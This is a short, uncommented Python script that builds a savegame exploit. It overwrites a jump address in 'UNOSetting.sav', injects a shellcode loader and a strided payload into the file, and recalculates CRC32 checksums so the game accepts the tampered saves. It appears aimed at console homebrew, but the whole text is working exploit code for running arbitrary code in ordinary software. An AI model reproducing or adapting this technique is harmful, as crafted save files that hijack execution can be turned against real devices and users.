import os,sys,binascii,struct
	
def injectshellcode(payload,target):
	JUMPADR=0x021EA138
	with open(payload, "rb") as f:
		buff=f.read()
	with open(target,"rb+") as f:
		f.seek(0x24E)
		f.write(struct.pack("<I",JUMPADR))
		f.seek(0x260)
		f.write(buff)

def splitinjectbin(initial, size, stride, payload, target):
	plen=0
	tlen=-1
	c=0
	f=open(payload,"rb")
	with open(target,"rb+") as g:
		g.seek(initial)
		while(tlen):
			print(tlen,initial)
			buff=f.read(size)
			tlen=len(buff)
			g.write(buff)
			initial+=stride
			g.seek(initial)
	f.close()

def fixCRC32(f):
	with open(f,"rb+") as f:
		buff=f.read()
		end=len(buff)-4
		crc32=binascii.crc32(buff[:end]) & 0xFFFFFFFF
		f.seek(end)
		f.write(struct.pack(">I",crc32))
	
injectshellcode("loader.bin", "UNOSetting.sav")
splitinjectbin(0x9B8, 0x638, 0x79C, "payload.dat", "UNOSetting.sav")
fixCRC32("UNOMatch.sav")
fixCRC32("UNOSetting.sav")